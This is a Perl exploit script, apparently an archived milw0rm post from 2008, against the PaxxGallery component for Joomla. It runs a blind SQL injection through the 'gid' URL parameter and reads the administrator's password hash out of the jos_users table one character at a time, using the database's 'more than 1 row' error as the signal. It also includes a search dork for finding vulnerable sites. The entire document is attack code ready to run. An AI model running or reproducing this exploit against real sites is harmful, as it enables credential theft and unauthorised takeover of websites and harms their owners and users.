#!/usr/bin/perl
use strict;
use LWP::Simple;
print "-+--[ Joomla Component PaxxGallery Blind SQL Injection Exploit (gid) ]--+-\n";
print "-+--                 \"more than 1 row\"                          --+-\n";
print "-+--                                                            --+-\n";
print "-+--            Author: ZAMUT                                   --+-\n";
print "-+--            Vuln: gid=                                      --+-\n";
print "-+--            Dork: option=com_paxxgallery                    --+-\n";

# Example:
# Url_Part_1: http://www.xxx.com/index.php?option=com_paxxgallery&Itemid=46&task=view&gid=7
# Url_Part_2: &iid=34

print "Url_Part_1:" ;
chomp(my $ur1=<STDIN>);
print "Url_Part_2:";
chomp(my $ur2=<STDIN>);
my $n=48;
my $i=1;
my $log= 1;
my ($content,$result) = undef;
my $request = 0;
while($log)
{
	$content = get($ur1.'+and+1=(select+1+from+jos_users+where+length(if(ascii(upper(substring((select+password+from+jos_users+where+id=62),'.$i.',1)))='.$n.',password,id))>4)/*'.$ur2);
	if($content =~ /Subquery returns more than 1 row/) {$result.=chr($n); $n=47; $i++;}
	elsif($i==33 || $content =~ /doesn\'t exist/) {$log = 0}
	else {$n++; if($n==58){$n=65} }
	$request++;
}
print "Administrator hash: ".$result."\n";
print "REQUEST: ".$request;

# milw0rm.com [2008-04-27]